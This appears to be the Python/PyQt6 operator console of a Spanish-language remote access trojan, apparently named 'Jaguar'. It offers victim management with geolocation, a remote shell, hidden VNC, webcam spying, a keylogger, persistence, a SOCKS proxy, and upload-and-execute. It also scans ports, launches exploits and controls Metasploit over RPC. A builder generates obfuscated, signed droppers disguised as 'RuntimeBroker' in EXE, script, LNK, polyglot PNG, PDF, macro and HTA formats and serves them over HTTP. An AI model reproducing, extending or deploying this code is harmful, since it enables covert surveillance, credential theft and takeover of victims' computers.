        return w

    # ------------------------------------------------------------------
    def _toggle_servidor(self):
        if self.servidor_activo:
            self.servidor.detener()
            self.servidor_activo = False
            self.btn_servidor.setText("▶  Iniciar servidor")
            self.btn_servidor.setChecked(False)
            self.lbl_estado.setText("● DETENIDO")
            self.lbl_estado.setStyleSheet("color:#ff2b2b;font-weight:700;padding-right:6px;")
        else:
            try:
                puerto = int(self.in_puerto_srv.text().strip() or self.servidor.puerto)
                self.servidor.iniciar(puerto)
                self.servidor_activo = True
                self.in_bpuerto.setText(str(puerto))
                self.btn_servidor.setText("⏹  Detener servidor")
                self.btn_servidor.setChecked(True)
                self.lbl_estado.setText(f"● ACTIVO :{self.servidor.puerto}")
                self.lbl_estado.setStyleSheet("color:#3ddc4a;font-weight:700;padding-right:6px;")
            except Exception as e:
                QMessageBox.critical(self, "Servidor", str(e))

    def iniciar_servidor(self):
        if not self.servidor_activo:
            self._toggle_servidor()

    def detener_servidor(self):
        if self.servidor_activo:
            self._toggle_servidor()

    def _on_cliente_conectado(self, cid, info):
        it = QTreeWidgetItem(["", cid[:8], info.get("host", "?"), info.get("usuario", "?"),
                              info.get("so", "?"), info.get("ip", "?"), "…", "", ""])
        it.setData(0, Qt.ItemDataRole.UserRole, cid)
        f = it.font(0)
        f.setPointSize(11)
        it.setFont(0, f)
        self.tree.addTopLevelItem(it)
        self.clientes[cid] = {"item": it, "info": info, "beacon": None}
        self._refrescar_conteo()
        self._log(f"[+] {info.get('host')} ({cid[:8]}) conectado desde {info.get('ip_externa','?')}")
        ip = info.get("ip_externa") or info.get("ip")
        threading.Thread(target=self._geo_worker, args=(cid, ip), daemon=True).start()

    def _geo_worker(self, cid, ip):
        datos = geo.geolocalizar(ip)
        if datos:
            self._sig_geo.emit(cid, datos)

    def _aplicar_geo(self, cid, datos):
        if cid not in self.clientes:
            return
        it = self.clientes[cid]["item"]
        it.setText(0, geo.bandera(datos.get("cc", "")))
        it.setText(6, datos.get("pais", ""))
        it.setText(7, datos.get("isp", ""))
        self.clientes[cid]["info"].update(datos)

    def _on_cliente_desconectado(self, cid):
        if cid in self.clientes:
            idx = self.tree.indexOfTopLevelItem(self.clientes[cid]["item"])
            self.tree.takeTopLevelItem(idx)
            del self.clientes[cid]
            self._refrescar_conteo()
            self._log(f"[-] {cid[:8]} desconectado")

    def _on_mensaje_recibido(self, cid, msg):
        if msg.get("tipo") != "respuesta":
            return
        cmd, ok, datos = msg.get("cmd"), msg.get("ok"), msg.get("datos")
        if cmd in ("ping", "raton", "teclado", "hvnc_raton", "hvnc_teclado") and ok:
            if cmd == "ping":
                ts = self._pings.get(cid)
                if ts and cid in self.clientes:
                    self.clientes[cid]["item"].setText(8, f"{int((time.time() - ts) * 1000)} ms")
            return
        if cmd == "hvnc_captura" and ok:
            self._enrutar_hvnc(cid, datos or {})
            return
        if cmd == "webcam_frame" and ok:
            self._enrutar_webcam(cid, datos or {})
            return
        self._log(f"[{cid[:8]}] '{cmd}' -> {'OK' if ok else 'ERROR'}")
        if ok and cmd == "captura":
            self._enrutar_frame(cid, datos or {})
        if cmd in ("hvnc_iniciar", "hvnc_cerrar", "hvnc_navegar",
                   "webcam_iniciar", "webcam_parar"):
            return
        for dlg in self.dialogs_por_cid.get(cid, []):
            if not ok:
                dlg.append_respuesta(f"ERROR: {msg.get('error')}")
            else:
                txt = json.dumps(datos, indent=2, ensure_ascii=False) if isinstance(datos, dict) else str(datos)
                dlg.append_respuesta(txt)

    def _log(self, t):
        self.log_text.append(t)

    def _on_builder_log(self, t):
        if hasattr(self, "out_builder") and self.out_builder is not None:
            self.out_builder.appendPlainText(t)

    def _refrescar_conteo(self):
        self.lbl_n.setText(str(len(self.clientes)))

    def _filtrar(self, texto):
        texto = texto.lower()
        for i in range(self.tree.topLevelItemCount()):
            it = self.tree.topLevelItem(i)
            visible = any(texto in it.text(c).lower() for c in range(1, len(COLS)))
            it.setHidden(not visible)

    def _mostrar_detalles(self):
        it = self.tree.currentItem()
        for v in self.det_labels.values():
            v.setText("—")
        if not it:
            return
        cid = it.data(0, Qt.ItemDataRole.UserRole)
        info = self.clientes.get(cid, {}).get("info", {})
        for clave, lab in self.det_labels.items():
            lab.setText(str(info.get(clave, "—")))

    def _ping_todos(self):
        for cid in list(self.clientes):
            ts = time.time()
            self._pings[cid] = ts
            self.servidor.enviar_comando(cid, "ping", {"ts": ts})

    # ------------------------------------------------------------------
    def _menu_contexto(self, pos):
        it = self.tree.itemAt(pos)
        if not it:
            return
        cid = it.data(0, Qt.ItemDataRole.UserRole)
        m = QMenu(self)
        acciones = [
            ("🖥  Terminal", lambda: self._abrir_terminal(cid)),
            ("🖥  Escritorio remoto (control)", lambda: self._abrir_escritorio(cid)),
            ("🌐  HVNC (navegador)", lambda: self._abrir_hvnc(cid)),
            ("📊  Info del sistema", lambda: self._enviar_comando(cid, "sysinfo")),
            ("📂  Listar directorio", lambda: self._pedir_y(cid, "listar_dir", "Ruta", ".")),
            ("⚡  Procesos", lambda: self._enviar_comando(cid, "procesos")),
            ("🖼  Captura", lambda: self._enviar_comando(cid, "captura")),
            ("📸  Screenshot (guardar PNG)", lambda: self._screenshot(cid)),
            ("🖱  Cambiar botones del ratón (swap)", lambda: self._enviar_comando(cid, "swap_raton")),
            ("📷  Webcam en vivo", lambda: self._abrir_webcam(cid)),
            ("⌨️  Keylogger iniciar", lambda: self._enviar_comando(cid, "keylogger_iniciar")),
            ("📜  Keylogger leer", lambda: self._enviar_comando(cid, "keylogger_leer")),
            ("🔓  Persistencia", lambda: self._enviar_comando(cid, "persistir")),
            ("🌍  Iniciar proxy SOCKS5 (:1080)", lambda: self._enviar_comando(cid, "proxy_iniciar", {"puerto": 1080})),
            ("🌍  Parar proxy SOCKS5", lambda: self._enviar_comando(cid, "proxy_parar")),
            ("🌐  Abrir URL", lambda: self._pedir_y(cid, "abrir_url", "URL", "https://")),
            ("💬  Mensaje", lambda: self._pedir_y(cid, "mensaje", "Texto", "Hola")),
            ("⬇️  Descargar archivo", lambda: self._descargar(cid)),
            ("⬆️  Subir y ejecutar", lambda: self._subir_ejecutar(cid)),
            ("❌  Desconectar", lambda: self._enviar_comando(cid, "desconectar")),
        ]
        for txt, fn in acciones:
            a = QAction(txt, self)
            a.triggered.connect(fn)
            m.addAction(a)
        m.exec(self.tree.viewport().mapToGlobal(pos))

    def _enviar_comando(self, cid, cmd, args=None):
        if cid not in self.clientes:
            return
        self.servidor.enviar_comando(cid, cmd, args or {})
        if cmd not in ("raton", "teclado", "ping",
                       "hvnc_raton", "hvnc_captura", "webcam_frame"):
            self._log(f"[→] '{cmd}' a {cid[:8]}")

    def _pedir_y(self, cid, cmd, etiqueta, defecto):
        texto, ok = QInputDialog.getText(self, cmd, etiqueta + ":", text=defecto)
        if ok:
            clave = {"listar_dir": "ruta", "abrir_url": "url", "mensaje": "texto"}[cmd]
            self._enviar_comando(cid, cmd, {clave: texto})

    def _abrir_terminal(self, cid):
        if cid not in self.clientes:
            return
        dlg = TerminalDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.dialogs_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_escritorio(self, cid):
        if cid not in self.clientes:
            return
        dlg = EscritorioDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.escritorios_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_hvnc(self, cid):
        if cid not in self.clientes:
            return
        dlg = HvncDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.hvnc_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _abrir_webcam(self, cid):
        if cid not in self.clientes:
            return
        dlg = WebcamDialog(cid, self.clientes[cid]["item"].text(2), self)
        self.webcams_por_cid.setdefault(cid, []).append(dlg)
        dlg.show()

    def _enrutar_frame(self, cid, datos):
        b64 = datos.get("b64", "")
        if cid in self._screenshot_pend and b64:
            try:
                carpeta = self._screenshot_pend.pop(cid)
                nombre = f"{cid[:8]}_{time.strftime('%Y%m%d_%H%M%S')}.png"
                with open(os.path.join(carpeta, nombre), "wb") as f:
                    f.write(base64.b64decode(b64))
                self._log(f"[screenshot] guardado: {carpeta}\\{nombre}")
            except Exception as e:
                self._log(f"[screenshot] error: {e}")
        for dlg in self.escritorios_por_cid.get(cid, []):
            try:
                raw = base64.b64decode(b64)
                pm = QPixmap()
                pm.loadFromData(raw)
                dlg.set_frame(pm, datos.get("w", 1920), datos.get("h", 1080))
            except Exception:
                pass

    def _enrutar_hvnc(self, cid, datos):
        for dlg in self.hvnc_por_cid.get(cid, []):
            try:
                raw = base64.b64decode(datos.get("b64", ""))
                pm = QPixmap()
                pm.loadFromData(raw)
                dlg.set_frame(pm, datos.get("w", 1200), datos.get("h", 800))
            except Exception:
                pass

    def _enrutar_webcam(self, cid, datos):
        for dlg in self.webcams_por_cid.get(cid, []):
            try:
                raw = base64.b64decode(datos.get("b64", ""))
                pm = QPixmap()
                pm.loadFromData(raw)
                dlg.set_frame(pm, datos.get("w", 640), datos.get("h", 480))
            except Exception:
                pass

    def _descargar(self, cid):
        ruta, ok = QInputDialog.getText(self, "Descargar", "Ruta remota:")
        if ok and ruta:
            self._enviar_comando(cid, "descargar", {"ruta": ruta})

    def _screenshot(self, cid):
        carpeta = os.path.join(os.path.expanduser("~"), "JaguarScreenshots")
        os.makedirs(carpeta, exist_ok=True)
        self._screenshot_pend[cid] = carpeta
        self._enviar_comando(cid, "captura")

    def _subir_ejecutar(self, cid):
        ruta, _ = QFileDialog.getOpenFileName(self, "Subir y ejecutar")
        if not ruta:
            return
        with open(ruta, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        self._enviar_comando(cid, "subir_ejecutar",
                             {"nombre": os.path.basename(ruta), "b64": b64})

    # ------------------------------------------------------------------
    def _escanear(self):
        objetivo = self.in_objetivo.text().strip()
        puertos = self.in_puertos.text().strip()
        usar_nmap = self.chk_nmap.isChecked()
        self.res_escaner.clear()
        self.barra.setValue(0)
        self.btn_escanear.setEnabled(False)

        def worker():
            res = escaner.escanear(objetivo, puertos,
                                   progreso=lambda v: self._sig_escaneo_prog.emit(v),
                                   usar_nmap=usar_nmap)
            self._sig_escaneo_fin.emit(res)
        threading.Thread(target=worker, daemon=True).start()

    def _on_escaneo_prog(self, v):
        self.barra.setValue(v)

    def _on_escaneo_fin(self, res):
        self.btn_escanear.setEnabled(True)
        self.ultimo_escaneo = res
        self.barra.setValue(100)
        for d in res:
            for p in d["puertos"]:
                QTreeWidgetItem(self.res_escaner,
                                [d["ip"], d.get("host", ""), str(p["puerto"]),
                                 p["servicio"], p.get("banner", "")])
        self._log(f"[escáner] {len(res)} host(s) con puertos abiertos")

    def _recomendar_desde_escaneo(self):
        recs = exploits.recomendar(self.ultimo_escaneo)
        self.tree_exploits.clear()
        for r in recs:
            QTreeWidgetItem(self.tree_exploits,
                            [r["ip"], str(r["puerto"]), r["nombre"], r["cve"],
                             r["riesgo"], r["so"], r["cmd"]])
        self.tabs.setCurrentIndex(1)
        self._log(f"[exploits] {len(recs)} recomendación(es)")

    def _rec_actual(self):
        it = self.tree_exploits.currentItem()
        if not it:
            return None
        for r in exploits.recomendar(self.ultimo_escaneo):
            if r["ip"] == it.text(0) and str(r["puerto"]) == it.text(1):
                return r
        return None

    def _lanzar_exploit(self):
        r = self._rec_actual()
        if not r:
            QMessageBox.information(self, "Exploit", "Selecciona un exploit.")
            return
        sel = self.tree.currentItem()
        if sel:
            self._enviar_comando(sel.data(0, Qt.ItemDataRole.UserRole),
                                 "shell", {"comando": exploits.comando_para(r)})
        else:
            QMessageBox.information(self, "Exploit", exploits.comando_para(r))

    def _copiar_exploit(self):
        r = self._rec_actual()
        if r:
            from PyQt6.QtWidgets import QApplication
            QApplication.clipboard().setText(exploits.comando_para(r))
            self._log("[exploits] comando copiado")

    # ------------------------------------------------------------------ msf
    def _msf_cliente(self):
        if self.msf is None:
            from jaguar.common.msf_rpc import MsfRpc
            self.msf = MsfRpc(self.in_msf_host.text().strip(),
                              self.in_msf_puerto.text().strip(),
                              self.in_msf_user.text().strip(),
                              self.in_msf_pass.text())
        return self.msf

    def _msf_tarea(self, fn):
        def worker():
            try:
                fn()
            except Exception as e:
                self._sig_msf.emit(f"ERROR: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def _append_msf(self, t):
        self.out_msf.appendPlainText(t)

    def _msf_conectar(self):
        def fn():
            m = self._msf_cliente()
            m.login()
            self._sig_msf.emit(f"[msf] conectado a {self.in_msf_host.text()}:{self.in_msf_puerto.text()}")
            self._sig_msf.emit(f"[msf] version: {m.version()}")
        self._msf_tarea(fn)

    def _msf_sesiones(self):
        def fn():
            r = self._msf_cliente().sesiones()
            self._sig_msf.emit("[msf] sesiones:\n" + json.dumps(r, indent=2, ensure_ascii=False, default=str))
        self._msf_tarea(fn)

    def _msf_jobs(self):
        def fn():
            r = self._msf_cliente().trabajos()
            self._sig_msf.emit("[msf] jobs: " + json.dumps(r, ensure_ascii=False, default=str))
        self._msf_tarea(fn)

    def _msf_modulos(self):
        def fn():
            tipo = self.in_msf_tipo.currentText()
            r = self._msf_cliente().modulos(tipo)
            self._sig_msf.emit(f"[msf] {len(r)} módulos {tipo} cargados")
        self._msf_tarea(fn)

    def _msf_ejecutar(self):
        def fn():
            opts = {}
            if self.in_msf_rhosts.text().strip():
                opts["RHOSTS"] = self.in_msf_rhosts.text().strip()
            if self.in_msf_rport.text().strip():
                opts["RPORT"] = int(self.in_msf_rport.text())
            if self.in_msf_payload.text().strip():
                opts["PAYLOAD"] = self.in_msf_payload.text().strip()
            r = self._msf_cliente().ejecutar_modulo(
                self.in_msf_tipo.currentText(), self.in_msf_modulo.text().strip(), opts)
            self._sig_msf.emit("[msf] ejecutado: " + json.dumps(r, ensure_ascii=False, default=str))
        self._msf_tarea(fn)

    # ------------------------------------------------------------------
    def _beacon_sel(self):
        it = self.tree.currentItem()
        if not it:
            QMessageBox.information(self, "Beacon", "Selecciona un cliente.")
            return
        self._aplicar_beacon(it.data(0, Qt.ItemDataRole.UserRole))

    def _beacon_todos(self):
        for cid in list(self.clientes):
            self._aplicar_beacon(cid)

    def _aplicar_beacon(self, cid):
        sleep = float(self.in_sleep.text() or 5)
        jitter = int(self.in_jitter.text() or 20)
        self.servidor.enviar_beacon(cid, sleep, jitter)
        if cid in self.clientes:
            self.clientes[cid]["beacon"] = (sleep, jitter)
        self._log(f"[beacon] {cid[:8]} -> sleep={sleep} jitter={jitter}%")
        self._beacon_refrescar()

    def _beacon_refrescar(self):
        self.tree_beacons.clear()
        for cid, d in self.clientes.items():
            b = d.get("beacon")
            info = d["info"]
            QTreeWidgetItem(self.tree_beacons,
                            [cid[:8], info.get("host", ""), info.get("ip", ""),
                             str(b[0]) if b else "-", str(b[1]) if b else "-",
                             "beacon activo" if b else "normal"])

    # ------------------------------------------------------------------
    def _hacer_constructor(self):
        comp = self.in_bcomp.currentText() if hasattr(self, "in_bcomp") else "pyinstaller"
        pyarmor = self.chk_pyarmor.isChecked() if hasattr(self, "chk_pyarmor") else False
        return Constructor(
            self.in_bhost.text().strip(),
            self.in_bpuerto.text().strip() or self.servidor.puerto,
            log=self._sig_builder.emit,
            nombre=self.in_bnombre.text().strip() or "RuntimeBroker",
            icono=self.in_bicono.text().strip() or None,
            upx=self.in_bupx.text().strip() or None,
            certificado=self.in_bcert.text().strip() or None,
            contrasena_cert=self.in_bpass.text() or None,
            compilador=comp,
            usar_pyarmor=pyarmor)

    def _guardar_config(self):
        try:
            from jaguar.common import config
            config.guardar(self.in_bhost.text().strip(),
                           self.in_bpuerto.text().strip())
        except Exception:
            pass

    def _detectar_ip_publica(self):
        def worker():
            try:
                import urllib.request
                ip = urllib.request.urlopen("https://api.ipify.org", timeout=6).read().decode().strip()
                self.in_bhost.setText(ip)
                self._sig_builder.emit(f"[builder] IP pública detectada: {ip} "
                                       "(abre el puerto en el router para WAN)")
            except Exception as e:
                self._sig_builder.emit(f"[builder] no pude detectar IP pública: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def _probar_conexion(self):
        import socket
        host = self.in_bhost.text().strip()
        try:
            p = int(self.in_bpuerto.text().strip() or self.servidor.puerto)
        except Exception:
            p = self.servidor.puerto
        def worker():
            try:
                s = socket.create_connection((host, p), timeout=5); s.close()
                self._sig_builder.emit(f"[builder] OK: {host}:{p} responde")
            except Exception as e:
                self._sig_builder.emit(f"[builder] FALLO {host}:{p}: {e}")
        threading.Thread(target=worker, daemon=True).start()    

    def _build_todo(self):
        c = self._hacer_constructor()
        self.out_builder.clear()
        self._sig_builder.emit("[builder] generando TODO ...")

        def worker():
            try:
                c.generar_todo()
                self._sig_builder.emit("[builder] ✓ listo.")
            except Exception as e:
                import traceback
                self._sig_builder.emit(f"[builder] ERROR: {e}")
                self._sig_builder.emit(traceback.format_exc())
        threading.Thread(target=worker, daemon=True).start()

    def _build_uno(self, cual):
        c = self._hacer_constructor()
        fn = {"exe": c.generar_exe, "bat": c.generar_bat, "vbs": c.generar_vbs,
              "ps1": c.generar_ps1, "lnk": c.generar_lnk, "png": c.generar_png_polyglot,
              "pdf": c.generar_pdf, "macro": c.generar_macro, "hta": c.generar_hta}[cual]

        def worker():
            try:
                fn()
            except Exception as e:
                import traceback
                self._sig_builder.emit(f"[builder] ERROR: {e}")
                self._sig_builder.emit(traceback.format_exc())
        threading.Thread(target=worker, daemon=True).start()

    def _servir_dist(self):
        c = self._hacer_constructor()

        def worker():
            try:
                c.servir_http(8080)
            except Exception as e:
                self._sig_builder.emit(f"[builder] ERROR http: {e}")
        threading.Thread(target=worker, daemon=True).start()
        self._sig_builder.emit("[builder] HTTP activo en :8080 (deja la ventana abierta)")